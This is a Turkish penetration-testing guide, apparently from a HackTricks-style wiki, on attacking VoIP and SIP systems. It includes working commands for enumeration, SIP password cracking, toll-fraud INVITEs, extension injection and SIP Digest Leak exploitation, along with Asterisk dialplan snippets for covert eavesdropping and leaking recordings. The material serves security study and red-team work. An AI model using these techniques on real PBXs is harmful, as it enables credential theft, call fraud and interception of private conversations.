# VoIP Temel Bilgiler

Başlamak için VoIP'in nasıl çalıştığını öğrenmek için şu kaynağa göz atabilirsiniz:

{% content-ref url="basic-voip-protocols/" %}
[basic-voip-protocols](basic-voip-protocols/)
{% endcontent-ref %}

## Temel Mesajlar
```
Request name	Description								RFC references
------------------------------------------------------------------------------------------------------
REGISTER	Register a SIP user.							RFC 3261
INVITE		Initiate a dialog for establishing a call. 				RFC 3261
ACK		Confirm that an entity has received.					RFC 3261
BYE		Signal termination of a dialog and end a call.				RFC 3261
CANCEL		Cancel any pending request.						RFC 3261
UPDATE		Modify the state of a session without changing the state of the dialog.	RFC 3311
REFER		Ask recipient to issue a request for the purpose of call transfer.	RFC 3515
PRACK		Provisional acknowledgement.						RFC 3262
SUBSCRIBE	Initiates a subscription for notification of events from a notifier.	RFC 6665
NOTIFY		Inform a subscriber of notifications of a new event.			RFC 6665
PUBLISH		Publish an event to a notification server.				RFC 3903
MESSAGE		Deliver a text message.	Used in instant messaging applications.		RFC 3428
INFO		Send mid-session information that does not modify the session state.	RFC 6086
OPTIONS		Query the capabilities of an endpoint					RFC 3261
```
## Yanıt Kodları

**1xx—Geçici Yanıtlar**
```
100 Trying
180 Ringing
181 Call is Being Forwarded
182 Queued
183 Session Progress
199 Early Dialog Terminated
```
**2xx—Başarılı Yanıtlar**
```
200 OK
202 Accepted
204 No Notification
```
**3xx—Yönlendirme Yanıtları**
```
300 Multiple Choices
301 Moved Permanently
302 Moved Temporarily
305 Use Proxy
380 Alternative Service
```
**4xx—İstemci Hatası Yanıtları**
```
400 Bad Request
401 Unauthorized
402 Payment Required
403 Forbidden
404 Not Found
405 Method Not Allowed
406 Not Acceptable
407 Proxy Authentication Required
408 Request Timeout
409 Conflict
410 Gone
411 Length Required
412 Conditional Request Failed
413 Request Entity Too Large
414 Request-URI Too Long
415 Unsupported Media Type
416 Unsupported URI Scheme
417 Unknown Resource-Priority
420 Bad Extension
421 Extension Required
422 Session Interval Too Small
423 Interval Too Brief
424 Bad Location Information
425 Bad Alert Message
428 Use Identity Header
429 Provide Referrer Identity
430 Flow Failed
433 Anonymity Disallowed
436 Bad Identity-Info
437 Unsupported Certificate
438 Invalid Identity Header
439 First Hop Lacks Outbound Support
440 Max-Breadth Exceeded
469 Bad Info Package
470 Consent Needed
480 Temporarily Unavailable
481 Call/Transaction Does Not Exist
482 Loop Detected
483 Too Many Hops
484 Address Incomplete
485 Ambiguous
486 Busy Here
487 Request Terminated
488 Not Acceptable Here
489 Bad Event
491 Request Pending
493 Undecipherable
494 Security Agreement Required
```
**5xx—Sunucu Hatası Yanıtları**
```
500 Internal Server Error
501 Not Implemented
502 Bad Gateway
503 Service Unavailable
504 Server Time-out
505 Version Not Supported
513 Message Too Large
555 Push Notification Service Not Supported
580 Precondition Failure
```
**6xx—Küresel Başarısızlık Yanıtları**
```
600 Busy Everywhere
603 Decline
604 Does Not Exist Anywhere
606 Not Acceptable
607 Unwanted
608 Rejected
```
## VoIP Numaraları Saptama

### Telefon Numaraları

Kırmızı Takım'ın yapabileceği ilk adımlardan biri, OSINT araçları, Google Aramaları veya web sayfalarını kazıyarak şirketle iletişim kurmak için kullanılabilecek telefon numaralarını aramaktır.

Telefon numaralarına sahip olduktan sonra operatörü tanımlamak için çevrimiçi hizmetler kullanabilirsiniz:

* [https://www.numberingplans.com/?page=analysis\&sub=phonenr](https://www.numberingplans.com/?page=analysis\&sub=phonenr)
* [https://mobilenumbertracker.com/](https://mobilenumbertracker.com/)
* [https://www.whitepages.com/](https://www.whitepages.com/)
* [https://www.twilio.com/lookup](https://www.twilio.com/lookup)

Operatörün VoIP hizmeti sağlayıp sağlamadığını bilmek, şirketin VoIP kullanıp kullanmadığını belirlemenizi sağlar... Ayrıca, şirketin VoIP hizmetleri kiralamamış olabileceği ancak kendi VoIP PBX'ini geleneksel telefon ağına bağlamak için PSTN kartları kullandığı da mümkündür.

Müzik gibi otomatik yanıtlar gibi şeyler genellikle VoIP kullanıldığını gösterir. 

### Google Dorks
```bash
# Grandstream phones
intitle:"Grandstream Device Configuration" Password
intitle:"Grandstream Device Configuration" (intext:password & intext:"Grandstream Device Configuration" & intext:"Grandstream Networks" | inurl:cgi-bin) -.com|org

# Cisco Callmanager
inurl:"ccmuser/logon.asp"
intitle:"Cisco CallManager User Options Log On" "Please enter your User ID and Password in the spaces provided below and click the Log On button"

# Cisco phones
inurl:"NetworkConfiguration" cisco

# Linksys phones
intitle:"Sipura SPA Configuration"

# Snom phones
intitle:"snom" intext:"Welcome to Your Phone!" inurl:line_login.htm

# Polycom SoundPoint IP & phones
intitle:"SoundPoint IP Configuration Utility - Registration"
"Welcome to Polycom Web Configuration Utility" "Login as" "Password"
intext: "Welcome to Polycom Web Configuration Utility" intitle:"Polycom - Configuration Utility" inurl:"coreConf.htm"
intitle:"Polycom Login" inurl:"/login.html"
intitle:"Polycom Login" -.com

# Elastix
intitle:"Elastix - Login page" intext:"Elastix is licensed under GPL"

# FreePBX
inurl:"maint/index.php?FreePBX" intitle: "FreePBX" intext:"FreePBX Admministration"
```
### OSINT bilgileri

VoIP yazılımının belirlenmesine yardımcı olan diğer OSINT numaralandırma işlemleri bir Kırmızı Takım için faydalı olacaktır.

### Ağ Numaralandırma

* **`nmap`**, UDP hizmetlerini tarama yeteneğine sahiptir, ancak taranan UDP hizmetlerinin sayısı nedeniyle bu tür hizmetlerle çok yavaş ve çok doğru olmayabilir.
```bash
sudo nmap --script=sip-methods -sU -p 5060 10.10.0.0/24
```
* **`svmap`** SIPVicious'tan (`sudo apt install sipvicious`): Belirtilen ağdaki SIP hizmetlerini bulacaktır.
* `svmap`, `friendly-scanner` Kullanıcı Ajanını kullandığı için **kolayca engellenebilir**, ancak `/usr/share/sipvicious/sipvicious` dizininden kodu değiştirerek bunu değiştirebilirsiniz.
```bash
# Use --fp to fingerprint the services
svmap 10.10.0.0/24 -p 5060-5070 [--fp]
```
* **`SIPPTS taraması`** [**sippts**](https://github.com/Pepelux/sippts)**:** SIPPTS taraması, UDP, TCP veya TLS üzerinden SIP hizmetleri için çok hızlı bir tarayıcıdır. Çoklu iş parçacığı kullanır ve geniş ağ aralıklarını tarayabilir. Kolayca bir bağlantı noktası aralığı belirtmeye, hem TCP hem de UDP'yi taramaya, başka bir yöntem kullanmaya izin verir (varsayılan olarak OPTIONS kullanacaktır) ve farklı bir Kullanıcı Ajanı belirtmeye (ve daha fazlasına).
```bash
sippts scan -i 10.10.0.0/24 -p all -r 5060-5080 -th 200 -ua Cisco [-m REGISTER]

[!] IP/Network: 10.10.0.0/24
[!] Port range: 5060-5080
[!] Protocol: UDP, TCP, TLS
[!] Method to scan: REGISTER
[!] Customized User-Agent: Cisco
[!] Used threads: 200
```
* **metasploit**:
```
auxiliary/scanner/sip/options_tcp normal  No     SIP Endpoint Scanner (TCP)
auxiliary/scanner/sip/options     normal  No     SIP Endpoint Scanner (UDP)
```
#### Ekstra Ağ Sıralaması

PBX ayrıca şu gibi diğer ağ hizmetlerini de açıklayabilir:

- **69/UDP (TFTP)**: Firmware güncellemeleri
- **80 (HTTP) / 443 (HTTPS)**: Cihazı web üzerinden yönetmek için
- **389 (LDAP)**: Kullanıcı bilgilerini depolamak için alternatif
- **3306 (MySQL)**: MySQL veritabanı
- **5038 (Yönetici)**: Asterisk'i diğer platformlardan kullanmaya olanak tanır
- **5222 (XMPP)**: Jabber kullanarak mesajlar
- **5432 (PostgreSQL)**: PostgreSQL veritabanı
- Ve diğerleri...

### Yöntemlerin Sıralanması

PBX'te kullanılabilir olan **hangi yöntemlerin bulunduğunu** [**sippts**](https://github.com/Pepelux/sippts) üzerinden `SIPPTS enumerate` kullanarak bulmak mümkündür.
```bash
sippts enumerate -i 10.10.0.10
```
### Sunucu yanıtlarının analizi

Bir sunucunun bize geri gönderdiği başlıkları analiz etmek, gönderdiğimiz mesajın türüne ve başlıklarına bağlı olarak çok önemlidir. [**sippts**](https://github.com/Pepelux/sippts) 'den `SIPPTS send` ile kişiselleştirilmiş mesajlar gönderebilir, tüm başlıkları manipüle edebilir ve yanıtı analiz edebiliriz.
```bash
sippts send -i 10.10.0.10 -m INVITE -ua Grandstream -fu 200 -fn Bob -fd 11.0.0.1 -tu 201 -fn Alice -td 11.0.0.2 -header "Allow-Events: presence" -sdp
```
Ayrıca, sunucu web soketleri kullanıyorsa veri elde etmek mümkündür. [**sippts**](https://github.com/Pepelux/sippts) üzerinden `SIPPTS wssend` kullanarak kişiselleştirilmiş WS mesajları gönderebiliriz.
```bash
sippts wssend -i 10.10.0.10 -r 443 -path /ws
```
### Uzantı Numaralarının Sıralanması

PBX (Özel Şube Değişimi) sistemlerinde uzantılar, bir organizasyonun veya işletmenin içindeki bireysel telefon hatları, cihazlar veya kullanıcılara atanan **benzersiz iç tanımlayıcılara** atıfta bulunur. Uzantılar, her kullanıcı veya cihaz için ayrı harici telefon numaralarına gerek kalmadan, **aramaların organizasyon içinde verimli bir şekilde yönlendirilmesini** sağlar.

* **`svwar`** from SIPVicious (`sudo apt install sipvicious`): `svwar`, ücretsiz bir SIP PBX uzantı hattı tarayıcısıdır. Kavram olarak, geleneksel wardialer'lar gibi çalışarak **bir dizi uzantıyı tahmin ederek veya belirli bir uzantı listesini kullanarak** çalışır.
```bash
svwar 10.10.0.10 -p5060 -e100-300 -m REGISTER
```
* **`SIPPTS exten`** [**sippts**](https://github.com/Pepelux/sippts)**:** SIPPTS exten, bir SIP sunucusundaki uzantıları tanımlar. Sipexten geniş ağ ve port aralıklarını kontrol edebilir.
```bash
sippts exten -i 10.10.0.10 -r 5060 -e 100-200
```
* **metasploit**: Metasploit ile uzantıları/kullanıcı adlarını da sıralayabilirsiniz:
```
auxiliary/scanner/sip/enumerator_tcp  normal  No     SIP Username Enumerator (TCP)
auxiliary/scanner/sip/enumerator      normal  No     SIP Username Enumerator (UDP)
```
* **`enumiax` (`apt install enumiax`): enumIAX**, Inter Asterisk Exchange protokolü için **kullanıcı adı brute-force numaralandırıcısı**'dır. enumIAX iki farklı modda çalışabilir; Sıralı Kullanıcı Adı Tahmini veya Sözlük Saldırısı.
```bash
enumiax -d /usr/share/wordlists/metasploit/unix_users.txt 10.10.0.10 # Use dictionary
enumiax -v -m3 -M3 10.10.0.10
```
## VoIP Saldırıları

### Şifre Kaba Kuvvet - çevrimiçi

Bir Kırmızı Takım, **PBX**'i ve bazı **dahili/kullanıcı adlarını** keşfettikten sonra, bir sözlük kullanarak kimlik doğrulamasını kaba kuvvet saldırısıyla deneyebilir ve bir uzantıya `REGISTER` yöntemi aracılığıyla kimlik doğrulamaya çalışabilir.

{% hint style="danger" %}
**Bir kullanıcı adının**, uzantı ile aynı olabileceğini unutmayın, ancak bu uygulama PBX sistemi, yapılandırması ve organizasyonun tercihlerine bağlı olarak değişebilir...

Eğer kullanıcı adı uzantı ile aynı değilse, **kullanıcı adını belirleyip kaba kuvvet uygulamak için** bunu çözmeniz gerekecektir.
{% endhint %}

* **SIPVicious**'dan **`svcrack`** (`sudo apt install sipvicious`): SVCrack, bir PBX üzerinde belirli bir kullanıcı adı/uzantı için şifreyi kırmak için kullanılır.
```bash
svcrack -u100 -d dictionary.txt udp://10.0.0.1:5080 #Crack known username
svcrack -u100 -r1-9999 -z4 10.0.0.1 #Check username in extensions
```
* **`SIPPTS rcrack`** [**sippts**](https://github.com/Pepelux/sippts)**:** SIPPTS rcrack, SIP hizmetleri için uzaktan şifre kırıcıdır. Rcrack, farklı IP'lerde ve port aralıklarında birkaç kullanıcı için şifreleri test edebilir.
```bash
sippts rcrack -i 10.10.0.10 -e 100,101,103-105 -w wordlist/rockyou.txt
```
* **Metasploit**:
* [https://github.com/jesusprubio/metasploit-sip/blob/master/sipcrack.rb](https://github.com/jesusprubio/metasploit-sip/blob/master/sipcrack.rb)
* [https://github.com/jesusprubio/metasploit-sip/blob/master/sipcrack\_tcp.rb](https://github.com/jesusprubio/metasploit-sip/blob/master/sipcrack\_tcp.rb)

### VoIP Sniffing

Eğer **Açık Wifi ağı** içinde VoIP ekipmanı bulursanız, **tüm bilgileri** **sızdırabilirsiniz**. Dahası, daha kapalı bir ağda bulunuyorsanız (Ethernet üzerinden bağlı veya korumalı Wifi ile bağlı), **ARPspoofing** gibi **MitM saldırıları** gerçekleştirebilir ve bilgileri **PBX ve ağ geçidi** arasında sızdırabilirsiniz.

Ağ bilgileri arasında, ekipmanı yönetmek için **web kimlik bilgileri**, kullanıcı **dahili numaraları**, **kullanıcı adı**, **IP** adresleri, hatta **karmakarışık şifreler** ve **konuşmayı dinlemek için çoğaltabileceğiniz RTP paketleri** bulabilirsiniz.

Bu bilgilere ulaşmak için Wireshark, tcpdump gibi araçları kullanabilirsiniz, ancak VoIP konuşmalarını sızdırmak için **özel olarak oluşturulmuş bir araç olan** [**ucsniff**](https://github.com/Seabreg/ucsniff) kullanabilirsiniz.

{% hint style="danger" %}
**SIP iletişiminde TLS kullanılıyorsa**, SIP iletişimini açık bir şekilde göremezsiniz.\
Aynı durum **SRTP** ve **ZRTP** kullanılıyorsa da geçerlidir, **RTP paketleri açık metin olmayacaktır**.
{% endhint %}

#### SIP kimlik bilgileri (Şifre Kaba Kuvvet - çevrimdışı)

Daha iyi anlamak için bu örneğe bakın: **SIP KAYIT iletişimini** daha iyi anlamak için [**SIP REGISTER örneğine**](basic-voip-protocols/sip-session-initiation-protocol.md#sip-register-example) bakın ve **kimlik bilgilerinin nasıl gönderildiğini** öğrenin.

* **`sipdump`** & **`sipcrack`,** **sipcrack**'in bir parçası (`apt-get install sipcrack`): Bu araçlar, SIP protokolü içindeki **digest kimlik doğrulamalarını** bir **pcap** dosyasından **çıkarabilir** ve **kaba kuvvet** uygulayabilir.
```bash
sipdump -p net-capture.pcap sip-creds.txt
sipcrack sip-creds.txt -w dict.txt
```
* **`SIPPTS dump`** [**sippts**](https://github.com/Pepelux/sippts)**:** SIPPTS dump, bir pcap dosyasından digest kimlik doğrulamalarını çıkarabilir.
```bash
sippts dump -f capture.pcap -o data.txt
```
* **`SIPPTS dcrack`** [**sippts**](https://github.com/Pepelux/sippts)**'dan:** SIPPTS dcrack, SIPPTS dump ile elde edilen digest kimlik doğrulamalarını kırmak için bir araçtır.
```bash
sippts dcrack -f data.txt -w wordlist/rockyou.txt
```
* **`SIPPTS tshark`** [**sippts**](https://github.com/Pepelux/sippts)**:** SIPPTS tshark, bir PCAP dosyasından SIP protokolü verilerini çıkarır.
```bash
sippts tshark -f capture.pcap [-filter auth]
```
#### DTMF kodları

Ağ trafiğinde **yalnızca SIP kimlik bilgileri** değil, aynı zamanda örneğin **sesli postaya erişmek** için kullanılan DTMF kodları da bulunabilir.\
Bu kodları **INFO SIP mesajları** içinde, **ses** içinde veya **RTP paketleri** içinde göndermek mümkündür. Kodlar RTP paketlerinin içindeyse, konuşmanın o kısmını kesip onları çıkarmak için multimo aracını kullanabilirsiniz:
```bash
multimon -a DTMF -t wac pin.wav
```
### Ücretsiz Aramalar / Asterisk Bağlantıları Yanlış Yapılandırmaları

Asterisk'te bir bağlantıya **belirli bir IP adresinden** veya **herhangi bir IP adresinden** izin vermek mümkündür:
```
host=10.10.10.10
host=dynamic
```
Eğer bir IP adresi belirtilmişse, ana makine **zaman zaman REGISTER** istekleri göndermek zorunda kalmayacak (REGISTER paketinde genellikle 30 dakika olan yaşam süresi gönderilir, bu da başka bir senaryoda telefonun her 30 dakikada bir REGISTER yapması gerektiği anlamına gelir). Bununla birlikte, aramaları almak için VoIP sunucusundan bağlantıları kabul eden açık portlara sahip olması gerekecektir.

Kullanıcıları tanımlamak için şu şekilde tanımlanabilirler:

* **`type=user`**: Kullanıcı sadece kullanıcı olarak aramaları alabilir.
* **`type=friend`**: Peer olarak aramalar yapılabilir ve kullanıcı olarak alınabilir (uzantılarla kullanılır)
* **`type=peer`**: Peer olarak aramalar yapılabilir ve alınabilir (SIP-trunk'larla kullanılır)

Ayrıca güvensiz değişkenle güven oluşturmak da mümkündür:

* **`insecure=port`**: IP tarafından doğrulanan peer bağlantılarına izin verir.
* **`insecure=invite`**: INVITE mesajları için kimlik doğrulaması gerektirmez
* **`insecure=port,invite`**: Her ikisi de

{% hint style="warning" %}
**`type=friend`** kullanıldığında, **host** değişkeninin **değeri** kullanılmayacak, bu yüzden bir yönetici o değeri kullanarak bir SIP-trunk'ı yanlış yapılandırırsa, **herkes ona bağlanabilecek**.

Örneğin, bu yapılandırma savunmasız olacaktır:\
`host=10.10.10.10`\
`insecure=port,invite`\
`type=friend`
{% endhint %}

### Ücretsiz Aramalar / Asterisk Bağlam Yanlış Yapılandırmaları

Asterisk'te bir **bağlam (context)**, **ilgili uzantıları, eylemleri ve kuralları gruplayan** ve adlandırılmış bir konteyner veya bölümdür. Çağrı planı, bir Asterisk sisteminin temel bileşenidir, çünkü **gelen ve giden aramaların nasıl ele alındığını ve yönlendirildiğini tanımlar**. Bağlamlar, çağrı planını düzenlemek, erişim kontrolünü yönetmek ve sistemin farklı bölümleri arasında ayrım sağlamak için kullanılır.

Her bağlam genellikle **`extensions.conf`** dosyasında tanımlanır. Bağlamlar, köşeli parantezlerle belirtilir ve bağlam adı bunların içine alınır. Örneğin:
```bash
csharpCopy code[my_context]
```
İçindeki bağlamda, uzantıları (çevrilen numaraların desenlerini) tanımlarsınız ve bunları bir dizi eylem veya uygulama ile ilişkilendirirsiniz. Bu eylemler çağrının nasıl işlendiğini belirler. Örneğin:
```scss
[my_context]
exten => 100,1,Answer()
exten => 100,n,Playback(welcome)
exten => 100,n,Hangup()
```
Bu örnek, "my\_context" adında basit bir bağlamı ve "100" uzantısını göstermektedir. Birisi 100 numarayı çevirdiğinde, arama cevaplanacak, bir karşılama mesajı çalınacak ve ardından arama sonlandırılacaktır.

Bu ise **başka bir bağlamdır** ve **herhangi bir başka numarayı aramaya izin verir**:
```scss
[external]
exten => _X.,1,Dial(SIP/trunk/${EXTEN})
```
Eğer yönetici **varsayılan bağlamı** şu şekilde tanımlarsa:
```
[default]
include => my_context
include => external
```
{% hint style="warning" %}
Herhangi biri, **sunucuyu kullanarak herhangi bir numarayı arayabilecek** (ve sunucu yöneticisi aramanın bedelini ödeyecek).
{% endhint %}

{% hint style="danger" %}
Dahası, varsayılan olarak **`sip.conf`** dosyası **`allowguest=true`** içerir, bu durumda **herhangi bir** kimlik doğrulaması olmadan **herhangi bir numarayı aramak mümkün olacaktır**.
{% endhint %}

*   **`SIPPTS invite`** from [**sippts**](https://github.com/Pepelux/sippts)**:** SIPPTS daveti, bir **PBX sunucusunun kimlik doğrulamasız aramalara izin verip vermediğini** kontrol eder. Eğer SIP sunucusu yanlış yapılandırılmışsa, harici numaralara arama yapmamıza izin verecektir. Ayrıca, aramayı ikinci bir harici numaraya aktarmamıza da izin verebilir.

Örneğin, Asterisk sunucunuzun kötü bir bağlam yapılandırması varsa, kimlik doğrulama olmadan INVITE isteğini kabul edebilirsiniz. Bu durumda, bir saldırgan herhangi bir kullanıcı/şifreyi bilmeden arama yapabilir.
```bash
# Trying to make a call to the number 555555555 (without auth) with source number 200.
sippts invite -i  10.10.0.10 -fu 200 -tu 555555555 -v

# Trying to make a call to the number 555555555 (without auth) and transfer it to number 444444444.
sippts invite -i 10.10.0.10 -tu 555555555 -t 444444444
```
{% endcode %}

### Ücretsiz aramalar / Yanlış yapılandırılmış IVRS

IVRS, **Interactive Voice Response System**'in kısaltmasıdır, kullanıcıların ses veya tuş tonu girişleri aracılığıyla bilgisayarlaştırılmış bir sistemle etkileşimde bulunmasını sağlayan bir telekomünikasyon teknolojisidir. IVRS, bilgi sağlama, çağrıları yönlendirme ve kullanıcı girişlerini yakalama gibi çeşitli işlevler sunan **otomatik çağrı işleme** sistemleri oluşturmak için kullanılır.

VoIP sistemlerinde IVRS genellikle şunlardan oluşur:

1. **Sesli ipuçları**: Kullanıcıları IVR menü seçenekleri ve talimatlarıyla yönlendiren önceden kaydedilmiş sesli mesajlar.
2. **DTMF** (Dual-Tone Multi-Frequency) sinyali: Telefon üzerinde tuşlara basarak oluşturulan tuş tonu girişleri, IVR menülerinde gezinmek ve giriş sağlamak için kullanılır.
3. **Çağrı yönlendirme**: Kullanıcı girişine bağlı olarak çağrıları belirli departmanlara, ajanlara veya uzantılara yönlendirme.
4. **Kullanıcı girişi yakalama**: Arayanlardan hesap numaraları, vaka kimlikleri veya diğer ilgili veriler gibi bilgileri toplama.
5. **Harici sistemlerle entegrasyon**: IVR sisteminin veritabanlarına veya diğer yazılım sistemlerine erişmesine veya bilgiyi güncellemesine, işlemler gerçekleştirmesine veya olayları tetiklemesine olanak tanır.

Asterisk VoIP sisteminde, IVR oluşturabilir ve `extensions.conf` dosyası gibi çeşitli uygulamalar ve `Background()`, `Playback()`, `Read()` gibi uygulamalar kullanarak sesli ipuçları çalabilir, kullanıcı girişi yakalayabilir ve çağrı akışını kontrol edebilirsiniz.

#### Hassas yapılandırma örneği
```scss
exten => 0,100,Read(numbers,the_call,,,,5)
exten => 0,101,GotoIf("$[${numbers}"="1"]?200)
exten => 0,102,GotoIf("$[${numbers}"="2"]?300)
exten => 0,103,GotoIf("$[${numbers}"=""]?100)
exten => 0,104,Dial(LOCAL/${numbers})
```
Önceki örnek bir kullanıcının bir bölümü aramak için **1'i tuşlaması**, başka bir bölümü aramak için **2'yi tuşlaması veya** bildiği takdirde **tam uzantıyı** girmesi istendiği bir örnektir.\
Zafiyet, belirtilen **uzantı uzunluğunun kontrol edilmemesidir, bu nedenle bir kullanıcı 5 saniyelik zaman aşımı süresinde tam bir numara girebilir ve aranır.**

### Uzantı Enjeksiyonu

Şu gibi bir uzantı kullanarak:
```scss
exten => _X.,1,Dial(SIP/${EXTEN})
```
**`${EXTEN}`**'in çağrılacak olan **dahili numara** olduğu yerde, **ext 101 tanıtıldığında** şu olacaklar:
```scss
exten => 101,1,Dial(SIP/101)
```
Ancak, eğer **`${EXTEN}`** daha önceki Asterisk sürümlerinde olduğu gibi **sadece sayıları değil daha fazlasını** tanımasına izin veriyorsa, bir saldırgan **`101&SIP123123123`** gibi bir değer girebilir ve telefon numarası 123123123'ü aramak için kullanabilir. Ve bu sonuç olacaktır:
```scss
exten => 101&SIP123123123,1,Dial(SIP/101&SIP123123123)
```
Bu nedenle, **`101`** uzantısına yapılan bir arama ve **`123123123`** numarasına gönderilecek ve aramayı ilk alanın kurulacağı... ancak bir saldırgan, gerçekleştirilen herhangi bir eşleşmeyi atlayan bir **uzantı kullanırsa** ve mevcut olmayan bir şey yaparsa, yalnızca istenen numaraya **arama enjekte edebilir**.

## SIPDigestLeak zafiyeti

SIP Digest Leak, donanım ve yazılım IP Telefonlarını ve telefon adaptörlerini (VoIP'ten analog'a) içeren geniş bir SIP Telefonlarını etkileyen bir zafiyettir. Bu zafiyet, **Digest kimlik doğrulama yanıtının sızmasına** izin verir, bu yanıt şifreden hesaplanır. Ardından **çevrimdışı bir şifre saldırısı mümkün olur** ve meydan okuma yanıtına dayanarak çoğu şifreyi kurtarabilir.

**[Buradan zafiyet senaryosu**](https://resources.enablesecurity.com/resources/sipdigestleak-tut.pdf):

1. Bir IP Telefonu (kurban), herhangi bir bağlantı noktasında dinleme yapar (örneğin: 5060), telefon aramalarını kabul eder
2. Saldırgan, IP Telefonuna bir INVITE gönderir
3. Kurban telefon çalmaya başlar ve biri telefonu açar ve kapatır (çünkü karşı tarafta kimse telefonu açmaz)
4. Telefon kapatıldığında, **kurban telefon bir BYE gönderir**
5. **Saldırgan, kimlik doğrulaması isteyen bir 407 yanıtı** verir ve bir kimlik doğrulama meydan okuması yapar
6. **Kurban telefon, ikinci bir BYE ile kimlik doğrulama meydan okumasına yanıt verir**
7. **Saldırgan, yerel makinesinde (veya dağıtılmış ağ vb.) meydan okuma yanıtına karşı brute-force saldırısı başlatabilir ve şifreyi tahmin edebilir**

* **SIPPTS sızıntısı** [**sippts**](https://github.com/Pepelux/sippts)**:** SIPPTS sızıntısı, birçok SIP Telefonunu etkileyen SIP Digest Leak zafiyetini sömürür. Çıktı, SIPPTS dcrack veya SipCrack aracını kullanarak brute-force saldırısı yapmak için SipCrack formatında kaydedilebilir.
```bash
sippts leak -i 10.10.0.10

[!] Target: 10.10.0.10:5060/UDP
[!] Caller: 100
[!] Callee: 100

[=>] Request INVITE
[<=] Response 100 Trying
[<=] Response 180 Ringing
[<=] Response 200 OK
[=>] Request ACK
... waiting for BYE ...
[<=] Received BYE
[=>] Request 407 Proxy Authentication Required
[<=] Received BYE with digest
[=>] Request 200 Ok

Auth=Digest username="pepelux", realm="asterisk", nonce="lcwnqoz0", uri="sip:100@10.10.0.10:56583;transport=UDP", response="31fece0d4ff6fd524c1d4c9482e99bb2", algorithm=MD5
```
### Click2Call

Click2Call, bir **web kullanıcısının** (örneğin bir ürüne ilgi duyan) **telefon numarasını tanıtmak** için kullanılmasına olanak tanır. Daha sonra bir reklam aranacak ve kullanıcı **telefonu açtığında** kullanıcı **arama yapılacak ve ajanla bağlantı kurulacak**.

Bunun için yaygın bir Asterisk profili:
```scss
[web_user]
secret = complex_password
deny = 0.0.0.0/0.0.0.0
allow = 0.0.0.0/0.0.0.0
displayconnects = yes
read = system,call,log,verbose,agent,user,config,dtmf,reporting,crd,diapla
write = system,call,agent,user,config,command,reporting,originate
```
* Önceki profil, **BİR IP adresinin bağlanmasına izin veriyor** (şifre biliniyorsa).
* Daha önce belirtildiği gibi bir çağrı **düzenlemek için okuma izinlerine gerek yoktur** ve sadece **yazma** izni ile **başlatma** gereklidir.

Bu izinlerle, şifreyi bilen herhangi bir IP adresi bağlanabilir ve çok fazla bilgi çıkarabilir, örneğin:
```bash
# Get all the peers
exec 3<>/dev/tcp/10.10.10.10/5038 && echo -e "Action: Login\nUsername:test\nSecret:password\nEvents: off\n\nAction:Command\nCommand: sip show peers\n\nAction: logoff\n\n">&3 && cat <&3
```
{% endcode %}

**Daha fazla bilgi veya eylem istenebilir.**

### **Kulak Misafiri Olma**

Asterisk'te, **`ChanSpy`** komutunu kullanarak **izlenecek uzantı(lar)**ı belirterek (veya hepsini) gerçekleşen konuşmaları dinlemek mümkündür. Bu komut bir uzantıya atanmalıdır.

Örneğin, **`exten => 333,1,ChanSpy('all',qb)`** komutu, **333 uzantısını aradığınızda**, **`all`** uzantıları **izleyeceğini**, yeni bir konuşma başladığında (**`b`**) sessiz modda (**`q`**) dinlemeye başlayacağını belirtir çünkü etkileşime girmek istemeyiz. Bir konuşmadan diğerine geçmek için **`*`** tuşuna basabilir veya uzantı numarasını işaretleyebilirsiniz.

Yalnızca bir uzantıyı izlemek için **`ExtenSpy`** kullanmak da mümkündür.

Konuşmaları dinlemek yerine, bunları dosyalara kaydetmek de mümkündür, örneğin:

{% code overflow="wrap" %}
```scss
[recorded-context]
exten => _X.,1,Set(NAME=/tmp/${CONTEXT}_${EXTEN}_${CALLERID(num)}_${UNIQUEID}.wav)
exten => _X.,2,MixMonitor(${NAME})
```
{% endcode %}

Aramalar **`/tmp`** dizininde kaydedilecektir.

Ayrıca Asterisk'in kapanırken aramayı sızdıracak bir betik **çalıştırmasını bile sağlayabilirsiniz**.
```scss
exten => h,1,System(/tmp/leak_conv.sh &)
```
### RTCPBleed güvenlik açığı

**RTCPBleed**, 2017 yılında yayınlanan ve Asterisk tabanlı VoIP sunucularını etkileyen ciddi bir güvenlik sorunudur. Bu zafiyet, VoIP konuşmalarını taşıyan **RTP (Gerçek Zamanlı Protokol) trafiğinin**, internet üzerindeki herhangi bir kişi tarafından **dinlenip yönlendirilmesine izin verir**. Bu durum, RTP trafiğinin NAT (Ağ Adresi Çevirisi) güvenlik duvarlarından geçerken kimlik doğrulamasını atlamasından kaynaklanmaktadır.

RTP proxy'leri, RTC sistemlerini etkileyen **NAT kısıtlamaları** ile başa çıkmaya çalışırken iki veya daha fazla taraf arasında RTP akışlarını proxy yaparak çözmeye çalışır. NAT devrede olduğunda, RTP proxy yazılımı genellikle sinyalizasyon aracılığıyla alınan RTP IP ve port bilgilerine güvenemez. Bu nedenle, birçok RTP proxy, bu tür **IP ve port çiftinin otomatik olarak öğrenildiği bir mekanizma uygulamıştır**. Bu genellikle gelen RTP trafiğini inceleyerek ve gelen RTP trafiği için kaynak IP ve portu yanıt verilmesi gereken IP ve port olarak işaretleyerek yapılır. Bu mekanizma, genellikle "öğrenme modu" olarak adlandırılabilir ve **herhangi bir kimlik doğrulama türünden yararlanmaz**. Bu nedenle **saldırganlar**, RTP trafiğini RTP proxy'ye **gönderebilir ve meşru kullanıcılara gönderilmesi gereken proxy RTP trafiğini alabilir**. Bu zafiyete RTP Bleed adı verilir çünkü saldırganlara meşru kullanıcılara gönderilmesi gereken RTP medya akışlarını alabilmelerine olanak tanır.

RTP proxy'lerinin ve RTP yığınlarının ilginç bir davranışı da bazen, **RTP Bleed'e duyarlı olmasalar bile**, **herhangi bir kaynaktan gelen RTP paketlerini kabul edecek, iletecek ve/veya işleyecek olmalarıdır**. Bu nedenle saldırganlar, meşru olanın yerine kendi medyalarını enjekte etmelerine izin verebilecek RTP paketleri gönderebilir. Bu saldırıya RTP enjeksiyonu adı verilir çünkü mevcut RTP akışlarına yasal olmayan RTP paketlerinin enjekte edilmesine izin verir. Bu zafiyet hem RTP proxy'lerinde hem de uç noktalarda bulunabilir.

Asterisk ve FreePBX geleneksel olarak **`NAT=yes` ayarını** kullanmıştır, bu da RTP trafiğinin kimlik doğrulamasını atlamasına olanak tanır ve çağrılarda ses olmamasına veya tek yönlü ses olmasına neden olabilir.

Daha fazla bilgi için [https://www.rtpbleed.com/](https://www.rtpbleed.com/)

